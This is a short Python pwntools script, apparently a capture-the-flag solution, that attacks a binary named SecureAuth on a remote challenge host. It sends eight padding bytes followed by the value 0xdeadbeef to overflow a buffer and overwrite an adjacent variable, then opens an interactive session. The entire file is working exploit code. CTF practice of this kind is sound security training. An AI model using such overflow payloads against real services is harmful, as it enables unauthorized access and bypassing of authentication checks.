#!/usr/bin/env python3
from pwn import *

context.update(arch='x86')
exe = './SecureAuth'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# p = start()
p = remote("gc1.eng.run", 32439)

#Change variable by overwriting
p.sendline(b"AAAAAAAA"+p64(0xdeadbeef))

p.interactive()

